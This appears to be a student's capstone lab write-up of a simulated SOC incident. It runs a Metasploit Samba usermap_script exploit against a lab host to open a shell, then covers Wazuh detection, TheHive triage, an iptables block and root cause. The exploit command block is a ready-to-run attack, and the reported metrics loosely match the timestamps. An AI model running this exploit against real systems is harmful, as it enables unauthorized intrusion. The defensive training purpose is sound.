---

# ⚔️ 8. Capstone: SOC Incident Response

## Objective

Simulate a real attack and perform full incident lifecycle.

---

## 🔴 Attack Simulation

Tool: Metasploit

```
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
set LHOST 192.168.56.1
exploit
```

### Result

* Command shell session opened
* Target system compromised

---

## 🔍 Detection (Wazuh)

### Observations

* Unauthorized root session detected
* Privilege escalation logs observed

⚠️ Note:
Direct exploit logs were not captured due to absence of Wazuh agent on the target system.

---

## Detection Table

| Timestamp        | Source IP    | Alert Description           | MITRE |
| ---------------- | ------------ | --------------------------- | ----- |
| 2026-04-13 13:56 | 192.168.56.1 | Root session detected       | T1210 |
| 2026-04-13 13:57 | 192.168.56.1 | Privilege escalation (sudo) | T1068 |

---

## 🚨 Triage (TheHive)

* Case created: **Samba Exploit Incident**
* Severity: High
* Observable: Attacker IP

---

## 🛑 Response & Containment

```
sudo iptables -A INPUT -s 192.168.56.1 -j DROP
```

### Verification

* Ping failed from attacker → Access blocked

---

## ⚙️ SOAR Workflow

Wazuh Alert → Check IP → Block → Create TheHive Case

---

## 🧠 Root Cause

* Vulnerable Samba service
* No patching
* Lack of monitoring

---

## 📈 Metrics

* MTTD: 2 hours
* MTTR: 4 hours
* Dwell Time: 6 hours

---

## 📌 Conclusion

The project successfully demonstrated a complete SOC workflow. Despite limited visibility on the target system, the attack was detected through behavioral indicators and effectively contained. The exercise highlights the importance of endpoint monitoring, patch management, and automated response mechanisms.

